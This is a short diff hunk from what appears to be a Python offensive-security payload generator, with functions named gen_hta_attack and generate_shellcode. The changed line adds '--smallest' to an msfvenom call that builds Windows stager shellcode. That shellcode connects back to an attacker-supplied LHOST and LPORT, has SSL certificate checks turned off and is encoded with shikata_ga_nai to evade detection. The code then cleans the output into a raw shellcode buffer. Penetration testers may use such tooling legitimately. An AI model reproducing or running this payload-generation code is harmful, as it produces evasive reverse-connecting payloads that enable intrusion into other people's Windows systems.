@@ -281,7 +281,7 @@ def gen_hta_attack(command):
 def generate_shellcode(payload, ipaddr, port):
     print "[*] Generating the payload shellcode.. This could take a few seconds/minutes as we create the shellcode..."
     port = port.replace("LPORT=", "")
-    proc = subprocess.Popen("msfvenom -p %s LHOST=%s LPORT=%s StagerURILength=5 StagerVerifySSLCert=false -e x86/shikata_ga_nai -a x86 --platform windows -f c" % (payload, ipaddr, port), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+    proc = subprocess.Popen("msfvenom -p %s LHOST=%s LPORT=%s StagerURILength=5 StagerVerifySSLCert=false -e x86/shikata_ga_nai -a x86 --platform windows --smallest -f c" % (payload, ipaddr, port), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
     data = proc.communicate()[0]
     # start to format this a bit to get it ready
     repls = {';': '', ' ': '', '+': '', '"': '', '\n': '', 'buf=': '', 'Found 0 compatible encoders': '', 'unsignedcharbuf[]=': ''}
